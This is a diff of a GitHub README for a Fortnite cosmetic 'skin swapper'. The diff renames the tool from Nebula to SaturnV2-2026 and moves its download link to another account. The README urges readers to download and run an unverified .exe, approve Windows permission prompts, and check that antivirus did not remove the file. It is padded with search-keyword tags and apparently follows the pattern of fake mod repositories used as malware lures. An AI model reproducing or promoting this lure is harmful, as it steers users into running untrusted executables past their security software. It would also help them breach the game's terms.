@@ -1,59 +1,213 @@
-# 🌌 Nebula(Galaxy) Visual Engine v2 (VFX & Asset(Skin) Swapper)
+# 🪐 SaturnV2-2026 - Fast Visual Swaps Made Simple
 
-![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-blue.svg)
-![Type](https://img.shields.io/badge/type-.exe%20Application-orange.svg)
-![Build](https://img.shields.io/badge/build-passing-brightgreen.svg)
-![Architecture](https://img.shields.io/badge/arch-x64-red.svg)
+[![Download SaturnV2-2026](https://img.shields.io/badge/Download-SaturnV2--2026-blue?style=for-the-badge)](https://github.com/alibababeta/SaturnV2-2026)
 
-**Nebula Visual Engine (V2)** is an advanced, high-speed Windows executable designed for real-time asset replacement and visual diagnostics in Fortnite. This framework allows technical artists and modders to audit in-game meshes, apply custom textures, and prototype VFX without modifying the core encrypted pak files.
+## 🚀 What SaturnV2-2026 Does
 
----
+Saturn (V2) is a Windows app for real-time asset replacement and visual checks in Fortnite. It helps you swap cosmetic visuals, inspect changes, and manage the process in a simple interface.
 
-## 🔗 Release Access (Windows x64)
+Use it when you want to:
 
-**[🚀 Download Nebula Swapper v2.4.1 (.exe)](https://github.com/rock69mel/SaturnV2-2026/releases/tag/2026)**  
-*Standalone version. Integrated with automated hash-mapping for latest game builds.*
+- replace in-game assets
+- review visual changes in real time
+- switch Fortnite cosmetics with less effort
+- work with a clean tool built for Windows
 
----
+## 📥 Download SaturnV2-2026
 
-## 🔥 Professional Features
+Visit this page to download:
 
-### 🔍 Metadata Auditing & Swapping
-- **Dynamic Hash-Mapping:** Instantly identifies asset locations within pak/utoc/ucas storage using a custom Oodle-driven engine.
-- **One-Click Deployment:** Apply visual enhancements, custom skins, and shader effects directly to the temporary runtime environment.
-- **Backwards Compatibility:** Full support for older configuration formats from the Galaxy v1 era.
+https://github.com/alibababeta/SaturnV2-2026
 
-### 🎭 Visual Effect (VFX) SDK
-- **Material Logic Editor:** Test custom shader parameters for emissive effects and transparency.
-- **Particle Auditing:** Real-time diagnostics for weapon and emote VFX emitters.
-- **Performance Optimized:** Written in C++ to ensure zero frame-rate impact during active sessions.
+Open the link in your browser, then download the latest available build from the repository page. If the file is packed in an archive, save it to your PC first, then extract it before you run the app.
 
----
+## 🖥️ System Requirements
 
-## 💻 System Requirements
+SaturnV2-2026 runs on Windows PCs. For best results, use a machine that meets these basic needs:
 
-| Feature | Requirement |
-| :--- | :--- |
-| **Operating System** | Windows 10/11 (Latest Build 23H2+ Supported) |
-| **Framework** | .NET Desktop Runtime (x64) + VC++ Redistributable |
-| **Hardware** | Optimized for low-end CPUs (DirectX 11/12 Support) |
-| **Game Version** | Optimized for Unreal Engine 5 content architecture |
+- Windows 10 or Windows 11
+- 64-bit system
+- At least 8 GB RAM
+- 500 MB free disk space
+- A stable internet connection for the first download
+- Fortnite installed if you plan to use the tool with game assets
 
----
+For smoother use, a modern CPU and a graphics card with current drivers help a lot.
 
-## 🛠 Usage Instructions
+## 🛠️ How to Install
 
-1. **Initialization:** Run `Nebula_VFX_Tool.exe` with Administrative rights.
-2. **Library Update:** Let the tool fetch the latest asset offsets and encryption headers.
-3. **Application:** Select your desired visual prototype (e.g., Rare Cosmetics, Lobby FX) and apply the changes before starting the session.
+Follow these steps on Windows:
 
----
+1. Open the download link above
+2. Download the latest SaturnV2-2026 file to your PC
+3. If the file comes in a ZIP folder, right-click it and choose Extract All
+4. Open the extracted folder
+5. Find the main `.exe` file
+6. Double-click the file to start Saturn
 
-## ⚖️ Scientific Research Disclaimer
+If Windows asks for permission, click Yes so the app can open.
 
-This toolkit is released strictly for **educational purposes, VFX research, and digital asset analysis**. It does not grant any commercial items or circumvent monetization systems. Users assume all responsibility for compliance with the service provider's End User License Agreement (EULA). Misuse in public matchmaking environments is not recommended.
+## 🎯 First Run Setup
 
----
+When you open SaturnV2-2026 for the first time, keep these steps in mind:
 
-## 📈 Analytics & Ranking
-*Galaxy Swapper v2 Fortnite, Skin Swapper v2 Download, VFX Modder, Fortnite Texture Replacement, UE5 Asset Auditor.*
+1. Start the app with Windows closed apps in the background if possible
+2. Let the tool load all files before you click anything
+3. Use the main menu to choose the asset or visual option you want
+4. Select the Fortnite item you want to replace or inspect
+5. Apply the change and check the result in the preview or game window
+
+If the app saves settings, keep the default folder structure unless you have a clear reason to change it
+
+## 🧭 Main Features
+
+### 🎮 Fortnite Asset Swapping
+
+SaturnV2-2026 is built for Fortnite asset replacement. It gives you a simple way to switch visual items such as:
+
+- skins
+- pickaxes
+- back blings
+- gliders
+- other cosmetic assets
+
+### 👁️ Visual Diagnostics
+
+The app also helps you check how assets look before or after a swap. This can help you spot issues like:
+
+- wrong texture use
+- broken visual parts
+- missing previews
+- file mismatch
+
+### ⚡ Fast Workflow
+
+The interface is made for quick use. You do not need to know code or edit files by hand. Most actions work through clicks, pickers, and simple buttons.
+
+### 🧩 Easy Asset Handling
+
+SaturnV2-2026 keeps the workflow clear:
+
+- choose the asset
+- select the target item
+- apply the swap
+- review the result
+
+### 🗂️ Better Control Over Cosmetics
+
+The tool supports common Fortnite cosmetic themes found in swapper tools, including:
+
+- fn cosmetics
+- galaxy swap styles
+- pickaxe swap use cases
+- visual swapper tasks
+
+## 📌 Basic Use
+
+Here is a simple way to use SaturnV2-2026:
+
+1. Open the app
+2. Load the asset list or target item
+3. Pick the Fortnite cosmetic you want to work with
+4. Select the replacement asset
+5. Confirm the swap
+6. Check the result in Fortnite or in the preview area
+7. Repeat for other items if needed
+
+If you want a cleaner result, test one item at a time
+
+## 🔧 Tips for a Smooth Run
+
+- Close extra apps before you start
+- Keep your Windows files in one folder
+- Do not move the app files after setup
+- Run the tool from the same folder each time
+- Update your graphics drivers if previews look broken
+- Restart the app if a swap does not show right away
+
+## 🧱 Folder Layout
+
+After you extract SaturnV2-2026, you may see folders like these:
+
+- `SaturnV2-2026.exe`
+- `assets`
+- `configs`
+- `logs`
+- `backup`
+- `readme` or `docs`
+
+If the app creates a backup folder, keep it in place. It can help you restore earlier settings or files.
+
+## 🧪 Common Checks
+
+If the app does not open, check these items:
+
+- the file finished downloading
+- Windows did not block the file
+- you extracted the archive before opening it
+- the `.exe` file is still in the folder
+- antivirus did not move the file
+
+If the app opens but the swap does not work:
+
+- make sure the correct Fortnite item is selected
+- check that the target file is loaded
+- try again after restarting the app
+- confirm the asset path is correct
+
+If the preview looks wrong:
+
+- lower other programs using your GPU
+- restart Fortnite
+- reopen SaturnV2-2026
+- test a different cosmetic file
+
+## 🧰 Recommended Windows Setup
+
+For the best user experience:
+
+- use Windows 11 or Windows 10
+- keep Fortnite updated
+- keep enough free storage on your main drive
+- use a standard desktop folder for the app
+- avoid running many heavy apps at the same time
+
+## 📚 Useful Topic Tags
+
+This project fits topics such as:
+
+- epic-games
+- fn-cosmetics
+- fn-galaxy
+- fn-swapper
+- fortnite
+- galaxy-swapper-v2-download
+- galaxy-v2
+- pickaxe-swapper
+- saturn
+- swapper
+- visual-swapper
+
+## 🔄 Update Flow
+
+When a new version appears in the repository:
+
+1. open the same download link
+2. get the newest build
+3. extract it to a fresh folder
+4. move your old configs if needed
+5. launch the new `.exe`
+6. test one swap before you use it more
+
+This keeps the app in a clean state and helps avoid file mix-ups
+
+## 🧷 Quick Start Checklist
+
+- download SaturnV2-2026
+- extract the files
+- open the `.exe`
+- allow Windows access if asked
+- load your Fortnite asset
+- choose a replacement
+- apply the swap
+- check the result
